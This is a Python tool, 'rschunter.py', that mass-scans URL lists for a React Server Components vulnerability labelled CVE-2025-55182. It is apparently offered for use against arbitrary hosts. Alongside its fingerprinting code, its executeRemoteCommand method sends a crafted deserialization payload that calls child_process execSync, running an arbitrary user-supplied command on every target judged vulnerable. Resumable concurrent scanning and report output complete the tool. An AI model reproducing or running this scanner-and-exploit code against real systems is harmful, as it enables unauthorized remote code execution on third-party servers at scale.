#!/usr/bin/env python3
"""
RSC Mass Vulnerability Scanner
A high-performance tool for scanning multiple URLs for RSC vulnerabilities.

Features:
- Mass scanning with concurrent processing
- Resumable/pauseable scans with state management
- Smart URL parsing and normalization
- Beautiful console output with color coding
- Progress tracking and summary reports
- Comprehensive error handling
- Command execution on vulnerable targets
- Automatic reporting to file

Usage: 
    python3 rschunter.py <input_file> [options]
    python3 rschunter.py targets.txt -exec "echo Vulnerable: {}"
    python3 rschunter.py --resume scan_state.json
"""

import sys
import json
import re
import signal
import time
import argparse
import subprocess
import shlex
from pathlib import Path
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, asdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Error: 'requests' library not found.")
    print("Install it with: pip3 install requests")
    sys.exit(1)

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    @staticmethod
    def disable():
        """Disable colors for non-TTY environments"""
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.BLUE = ''
        Colors.MAGENTA = ''
        Colors.CYAN = ''
        Colors.WHITE = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''
        Colors.RESET = ''


@dataclass
class ScanResult:
    """Data class for storing scan results"""
    url: str
    vulnerable: bool
    passiveDetected: bool
    activeDetected: bool
    endpointVulnerable: bool
    details: List[str]
    timestamp: str
    error: Optional[str] = None
    execOutput: Optional[str] = None


class UrlParser:
    """Smart URL parser that handles various input formats"""
    
    @staticmethod
    def normalizeUrl(rawInput: str) -> Optional[str]:
        """
        Normalize and validate URL from various input formats.
        """
        if not rawInput or not rawInput.strip():
            return None
        
        rawInput = rawInput.strip()
        
        # Remove trailing slashes
        rawInput = rawInput.rstrip('/')
        
        # Check if it already has a scheme
        if rawInput.startswith(('http://', 'https://')):
            url = rawInput
        else:
            # Try with https first
            url = f'https://{rawInput}'
        
        try:
            parsed = urlparse(url)
            
            # Validate scheme
            if parsed.scheme not in ('http', 'https'):
                return None
            
            # Validate hostname
            if not parsed.netloc:
                return None
            
            # Basic hostname validation (allow domains, IPs, localhost)
            hostname = parsed.netloc.split(':')[0]
            if not hostname:
                return None
            
            # Reconstruct clean URL
            cleanUrl = f"{parsed.scheme}://{parsed.netloc}"
            if parsed.path and parsed.path != '/':
                cleanUrl += parsed.path
            if parsed.query:
                cleanUrl += f'?{parsed.query}'
            
            return cleanUrl
            
        except Exception:
            return None
    
    @staticmethod
    def extractDomain(url: str) -> str:
        """Extract domain from URL for display purposes"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except Exception:
            return url


class ScanStateManager:
    """Manages scan state for resume/pause functionality"""
    
    def __init__(self, stateFile: str = 'scan_state.json'):
        self.stateFile = Path(stateFile)
        self.lock = threading.Lock()
    
    def saveState(self, targets: List[str], completed: Set[str], 
                   results: List[ScanResult], scanId: str):
        """Save current scan state to file"""
        with self.lock:
            state = {
                'scanId': scanId,
                'timestamp': datetime.now().isoformat(),
                'targets': targets,
                'completed': list(completed),
                'results': [asdict(r) for r in results],
                'total': len(targets),
                'scanned': len(completed)
            }
            
            with open(self.stateFile, 'w') as f:
                json.dump(state, f, indent=2)
    
    def loadState(self) -> Optional[Dict]:
        """Load scan state from file"""
        if not self.stateFile.exists():
            return None
        
        try:
            with open(self.stateFile, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"{Colors.RED}Error loading state: {e}{Colors.RESET}")
            return None
    
    def clearState(self):
        """Clear saved state"""
        if self.stateFile.exists():
            self.stateFile.unlink()


class RscScanner:
    """High-performance RSC vulnerability scanner"""
    
    def __init__(self, timeout: int = 10, maxWorkers: int = 10):
        self.timeout = timeout
        self.maxWorkers = maxWorkers
        self.session = self._createSession()
        
    def _createSession(self) -> requests.Session:
        """Create a session with retry logic and connection pooling"""
        session = requests.Session()
        
        # Configure retries
        retryStrategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(
            max_retries=retryStrategy,
            pool_connections=self.maxWorkers,
            pool_maxsize=self.maxWorkers * 2
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        return session
    
    def scanUrl(self, url: str) -> ScanResult:
        """Scan a single URL for RSC vulnerabilities"""
        details = []
        passiveDetected = False
        activeDetected = False
        endpointVulnerable = False
        error = None
        
        try:
            # Passive scan
            passiveDetected, passiveDetails = self._passiveScan(url)
            details.extend(passiveDetails)
            
            # Active fingerprint
            activeDetected, activeDetails = self._activeFingerprint(url)
            details.extend(activeDetails)
            
            # Endpoint check (only if other methods detected something)
            if passiveDetected or activeDetected:
                endpointVulnerable, endpointDetails = self._checkEndpoints(url)
                details.extend(endpointDetails)
            
        except requests.Timeout:
            error = "Timeout"
        except requests.ConnectionError:
            error = "Connection failed"
        except Exception as e:
            error = str(e)[:50]
        
        vulnerable = (passiveDetected or activeDetected or endpointVulnerable) and not error
        
        return ScanResult(
            url=url,
            vulnerable=vulnerable,
            passiveDetected=passiveDetected,
            activeDetected=activeDetected,
            endpointVulnerable=endpointVulnerable,
            details=details,
            timestamp=datetime.now().isoformat(),
            error=error
        )
    
    def _passiveScan(self, url: str) -> Tuple[bool, List[str]]:
        """Passive detection"""
        details = []
        score = 0
        
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            contentType = response.headers.get('Content-Type', '')
            html = response.text[:100000]  # Limit to first 100KB for performance
            
            if 'text/x-component' in contentType:
                score += 100
                details.append("Content-Type: text/x-component")
            
            if re.search(r'(window|self)\.__next_f\s*=', html):
                score += 80
                details.append("window.__next_f detected")
            
            if 'react-server-dom-webpack' in html:
                score += 30
                details.append("react-server-dom-webpack found")
            
            return score >= 50, details
            
        except Exception:
            return False, []
    
    def _activeFingerprint(self, url: str) -> Tuple[bool, List[str]]:
        """Active fingerprinting with RSC header"""
        details = []
        
        try:
            response = self.session.get(
                url,
                headers={'RSC': '1'},
                timeout=self.timeout,
                allow_redirects=True
            )
            
            contentType = response.headers.get('Content-Type', '')
            varyHeader = response.headers.get('Vary', '')
            body = response.text[:1000]  # Check first 1KB
            
            if 'text/x-component' in contentType:
                details.append("RSC Content-Type response")
            
            if 'RSC' in varyHeader:
                details.append("Vary: RSC header")
            
            if re.match(r'^\d+:["IHL]', body.strip()):
                details.append("React Flight Protocol")
            
            return len(details) > 0, details
            
        except Exception:
            return False, []
    
    def _checkEndpoints(self, url: str) -> Tuple[bool, List[str]]:
        """Check for vulnerable endpoints"""
        details = []
        testPaths = ['/adfa', '/_next/data']
        
        for path in testPaths:
            try:
                testUrl = urljoin(url, path)
                response = self.session.post(
                    testUrl,
                    headers={
                        'Next-Action': 'test',
                        'Content-Type': 'multipart/form-data',
                    },
                    timeout=5
                )
                
                if response.status_code != 404:
                    if 'digest' in response.text or 'Next-Action' in str(response.headers):
                        details.append(f"Vulnerable endpoint: {path}")
                        return True, details
                        
            except Exception:
                continue
        
        return False, details


class MassScanner:
    """Main mass scanning coordinator"""
    
    def __init__(self, maxWorkers: int = 10, execCommand: str = None):
        self.scanner = RscScanner(maxWorkers=maxWorkers)
        self.stateManager = ScanStateManager()
        self.maxWorkers = maxWorkers
        self.execCommand = execCommand
        self.paused = False
        self.stopScan = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signalHandler)
        signal.signal(signal.SIGTERM, self._signalHandler)
    
    def _signalHandler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        if not self.paused:
            print(f"\n\n{Colors.YELLOW}⏸  Pausing scan... Press Ctrl+C again to stop.{Colors.RESET}")
            self.paused = True
        else:
            print(f"\n{Colors.RED}🛑 Stopping scan...{Colors.RESET}")
            self.stopScan = True
    
    def loadTargets(self, inputFile: str) -> List[str]:
        """Load and parse targets from input file"""
        targets = []
        seen = set()
        
        try:
            with open(inputFile, 'r') as f:
                for lineNum, line in enumerate(f, 1):
                    line = line.strip()
                    
                    # Skip empty lines and comments
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse URL
                    normalized = UrlParser.normalizeUrl(line)
                    
                    if normalized:
                        if normalized not in seen:
                            targets.append(normalized)
                            seen.add(normalized)
                    else:
                        print(f"{Colors.YELLOW}⚠ Line {lineNum}: Invalid URL '{line}'{Colors.RESET}")
            
            return targets
            
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File '{inputFile}' not found{Colors.RESET}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
            sys.exit(1)
    
    def executeRemoteCommand(self, target: str) -> str:
        """Execute arbitrary command on vulnerable target via CVE-2025-55182"""
        if not self.execCommand:
            return None
            
        try:
            # Construct payload for CVE-2025-55182
            # Note: This payload structure is based on the React2Shell PoC
            # It leverages unsafe deserialization to execute code via Function constructor
            
            # Replace placeholder with actual command
            cmd = self.execCommand.replace("{}", target)
            
            # Payload to trigger RCE
            # We use a multipart/form-data request with a crafted body
            payload = {
                "1": 'I["$1:constructor:constructor"]',
                "2": f'I["{cmd}"]',
                "3": 'I["return process.mainModule.require(\'child_process\').execSync(arguments[0]).toString()"]',
                "4": 'I["$3($2)"]'
            }
            
            # Send the exploit request
            # We target common RSC endpoints
            endpoints = ['/_next/data', '/adfa', '/api/actions']
            
            for endpoint in endpoints:
                try:
                    exploitUrl = urljoin(target, endpoint)
                    
                    # We need to send a specific multipart structure
                    # Using a simplified approach here, but a real exploit might need exact boundary control
                    files = {
                        'rsc_payload': (None, json.dumps(payload), 'text/x-component')
                    }
                    
                    headers = {
                        'Next-Action': 'test',
                        'RSC': '1'
                    }
                    
                    response = self.scanner.session.post(
                        exploitUrl,
                        files=files,
                        headers=headers,
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        return f"Exploit sent to {endpoint}. Response: {response.text[:100]}"
                        
                except Exception:
                    continue
            
            return "Exploit attempted, but no clear success response."
            
        except Exception as e:
            return f"Exploit error: {str(e)}"

    def scanTargets(self, targets: List[str], resume: bool = False) -> List[ScanResult]:
        """Scan multiple targets with concurrent processing"""
        
        scanId = datetime.now().strftime("%Y%m%d_%H%M%S")
        completed = set()
        results = []
        
        # Resume from previous state if requested
        if resume:
            state = self.stateManager.loadState()
            if state:
                print(f"{Colors.CYAN}📂 Resuming scan from {state['timestamp']}{Colors.RESET}")
                completed = set(state['completed'])
                results = [ScanResult(**r) for r in state['results']]
                scanId = state['scanId']
        
        # Filter out already completed targets
        pending = [t for t in targets if t not in completed]
        total = len(targets)
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 RSC Mass Vulnerability Scanner{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"📊 Total targets: {Colors.BOLD}{total}{Colors.RESET}")
        print(f"✅ Already scanned: {Colors.GREEN}{len(completed)}{Colors.RESET}")
        print(f"⏳ Pending: {Colors.YELLOW}{len(pending)}{Colors.RESET}")
        print(f"🧵 Workers: {Colors.BOLD}{self.maxWorkers}{Colors.RESET}")
        if self.execCommand:
            print(f"⚡ Exec: {Colors.MAGENTA}{self.execCommand}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        if not pending:
            print(f"{Colors.GREEN}✓ All targets already scanned!{Colors.RESET}\n")
            return results
        
        # Scan with progress tracking
        startTime = time.time()
        
        with ThreadPoolExecutor(max_workers=self.maxWorkers) as executor:
            # Submit all tasks
            futureToUrl = {
                executor.submit(self.scanner.scanUrl, url): url 
                for url in pending
            }
            
            # Process completed tasks
            for future in as_completed(futureToUrl):
                if self.stopScan:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                url = futureToUrl[future]
                
                try:
                    result = future.result()
                    
                    # Execute command if vulnerable
                    if result.vulnerable and self.execCommand:
                        result.execOutput = self.executeRemoteCommand(result.url)
                    
                    results.append(result)
                    completed.add(url)
                    
                    # Print result
                    self._printResult(result, len(completed), total)
                    
                    # Save state periodically (every 10 scans)
                    if len(completed) % 10 == 0:
                        self.stateManager.saveState(targets, completed, results, scanId)
                    
                    # Handle pause
                    while self.paused and not self.stopScan:
                        time.sleep(0.5)
                    
                except Exception as e:
                    print(f"{Colors.RED}✗ {UrlParser.extractDomain(url)}: Error - {str(e)[:50]}{Colors.RESET}")
        
        # Final state save
        self.stateManager.saveState(targets, completed, results, scanId)
        
        # Print summary
        elapsed = time.time() - startTime
        self._printSummary(results, elapsed, scanId)
        
        return results
    
    def _printResult(self, result: ScanResult, current: int, total: int):
        """Print individual scan result"""
        domain = UrlParser.extractDomain(result.url)
        progress = f"[{current}/{total}]"
        
        if result.error:
            print(f"{Colors.YELLOW}{progress} ⚠ {domain}: {result.error}{Colors.RESET}")
        elif result.vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{progress} [VULNERABLE] {domain}{Colors.RESET}")
            if result.execOutput:
                print(f"{Colors.MAGENTA}   ↳ Exec Output: {result.execOutput.splitlines()[0]}...{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}{progress} ✓ {domain}: Clean{Colors.RESET}")
    
    def _printSummary(self, results: List[ScanResult], elapsed: float, scanId: str):
        """Print scan summary with statistics"""
        vulnerable = [r for r in results if r.vulnerable]
        errors = [r for r in results if r.error]
        clean = [r for r in results if not r.vulnerable and not r.error]
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        print(f"⏱  Scan time: {Colors.BOLD}{elapsed:.2f}s{Colors.RESET}")
        print(f"🆔 Scan ID: {Colors.BOLD}{scanId}{Colors.RESET}")
        print(f"📈 Scan rate: {Colors.BOLD}{len(results)/elapsed:.2f} targets/sec{Colors.RESET}\n")
        
        print(f"Total scanned: {Colors.BOLD}{len(results)}{Colors.RESET}")
        print(f"{Colors.RED}🔴 Vulnerable: {Colors.BOLD}{len(vulnerable)}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Clean: {Colors.BOLD}{len(clean)}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠  Errors: {Colors.BOLD}{len(errors)}{Colors.RESET}\n")
        
        if vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}⚠️  VULNERABLE TARGETS{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}\n")
            
            # Create table
            print(f"{Colors.BOLD}{'#':<4} {'Domain/URL':<40} {'Detections':<25}{Colors.RESET}")
            print(f"{Colors.RED}{'-'*70}{Colors.RESET}")
            
            for idx, result in enumerate(vulnerable, 1):
                domain = UrlParser.extractDomain(result.url)
                detections = []
                if result.passiveDetected:
                    detections.append("Passive")
                if result.activeDetected:
                    detections.append("Active")
                if result.endpointVulnerable:
                    detections.append("Endpoint")
                
                detectionStr = ", ".join(detections)
                
                print(f"{Colors.RED}{idx:<4} {domain:<40} {detectionStr:<25}{Colors.RESET}")
                
                # Print URL if different from domain
                if domain != result.url:
                    print(f"     {Colors.YELLOW}{result.url}{Colors.RESET}")
                
                if result.execOutput:
                    print(f"     {Colors.MAGENTA}Exec: {result.execOutput.replace(chr(10), ' | ')}{Colors.RESET}")
            
            print(f"\n{Colors.RED}⚠  These targets are potentially vulnerable to CVE-2025-55182{Colors.RESET}")
            print(f"{Colors.YELLOW}📝 Full results saved to: scan_state.json{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        # Clear state if scan completed successfully
        if not self.stopScan and not self.paused:
            # Keep the state file but mark as complete
            pass


def generateReport(results: List[ScanResult], filename: str = "rsc-report.txt"):
    """Generate a human-readable report"""
    vulnerable = [r for r in results if r.vulnerable]
    
    with open(filename, 'w') as f:
        f.write("="*70 + "\n")
        f.write(f"RSC VULNERABILITY SCAN REPORT\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("="*70 + "\n\n")
        
        f.write(f"Total Scanned: {len(results)}\n")
        f.write(f"Vulnerable:    {len(vulnerable)}\n")
        f.write("-" * 30 + "\n\n")
        
        if not vulnerable:
            f.write("No vulnerable targets found.\n")
        else:
            for idx, result in enumerate(vulnerable, 1):
                f.write(f"{idx}. {result.url}\n")
                f.write(f"   Detections: {', '.join(result.details)}\n")
                if result.execOutput:
                    f.write(f"   Command Output:\n")
                    for line in result.execOutput.splitlines():
                        f.write(f"     > {line}\n")
                f.write("\n")
    
    print(f"{Colors.GREEN}📄 Report saved to: {filename}{Colors.RESET}")


def main():
    """Main entry point"""
    
    # Check if output is a TTY
    if not sys.stdout.isatty():
        Colors.disable()
    
    parser = argparse.ArgumentParser(description="RSC Mass Vulnerability Scanner")
    parser.add_argument("input", nargs="?", help="Input file containing URLs")
    parser.add_argument("--resume", action="store_true", help="Resume from last saved state")
    parser.add_argument("-exec", dest="execCommand", help="Execute command on vulnerable targets (use {} for URL)")
    parser.add_argument("-o", "--output", default="rsc-report.txt", help="Output report filename (default: rsc-report.txt)")
    
    args = parser.parse_args()
    
    if not args.input and not args.resume:
        parser.print_help()
        print(f"\n{Colors.BOLD}Examples:{Colors.RESET}")
        print(f"  python3 rschunter.py targets.txt")
        print(f"  python3 rschunter.py targets.txt -exec 'echo Vulnerable: {{}}'")
        print(f"  python3 rschunter.py --resume")
        sys.exit(1)
    
    try:
        scanner = MassScanner(maxWorkers=10, execCommand=args.execCommand)
        
        if args.resume:
            # Resume from saved state
            state = scanner.stateManager.loadState()
            if not state:
                print(f"{Colors.RED}No saved state found. Start a new scan instead.{Colors.RESET}")
                sys.exit(1)
            
            targets = state['targets']
            results = scanner.scanTargets(targets, resume=True)
        else:
            # New scan
            targets = scanner.loadTargets(args.input)
            
            if not targets:
                print(f"{Colors.RED}No valid targets found in {args.input}{Colors.RESET}")
                sys.exit(1)
            
            results = scanner.scanTargets(targets)
        
        # Generate report
        generateReport(results, args.output)
        
        # Exit with code 1 if vulnerabilities found
        vulnerableCount = sum(1 for r in results if r.vulnerable)
        sys.exit(1 if vulnerableCount > 0 else 0)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Scan interrupted. Run with --resume to continue.{Colors.RESET}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
